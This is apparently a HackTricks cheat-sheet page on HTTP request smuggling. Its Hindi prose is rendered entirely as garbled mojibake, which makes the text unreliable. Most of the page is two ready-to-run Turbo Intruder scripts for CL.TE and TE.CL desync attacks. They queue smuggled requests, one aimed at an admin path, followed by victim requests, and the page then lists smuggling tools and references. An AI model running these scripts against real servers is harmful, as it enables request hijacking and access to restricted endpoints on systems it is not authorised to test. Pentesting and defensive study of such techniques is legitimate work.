* рдмреНрд░рд╛рдЙрдЬрд╝рд░ HTTP рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ (рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* рдПрдЪрдЯреАрдЯреАрдкреА/реи рдбрд╛рдЙрдирдЧреНрд░реЗрдб рдореЗрдВ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## рдЯрд░реНрдмреЛ рдЗрдВрдЯреНрд░реВрдбрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕

### рд╕реАрдПрд▓.рдЯреА

рд╕реЗ [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### рдЯреАрдИ.рд╕реА.рдПрд▓

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## рдЙрдкрдХрд░рдг

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): рдпрд╣ рдЙрдкрдХрд░рдг рдПрдХ рд╡реНрдпрд╛рдХрд░рдг-рдЖрдзрд╛рд░рд┐рдд HTTP Fuzzer рд╣реИ рдЬреЛ рдЕрдЬреАрдм рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рд╡рд┐рд╕рдВрдЧрддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдореЗрдВ рдорджрджрдЧрд╛рд░ рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
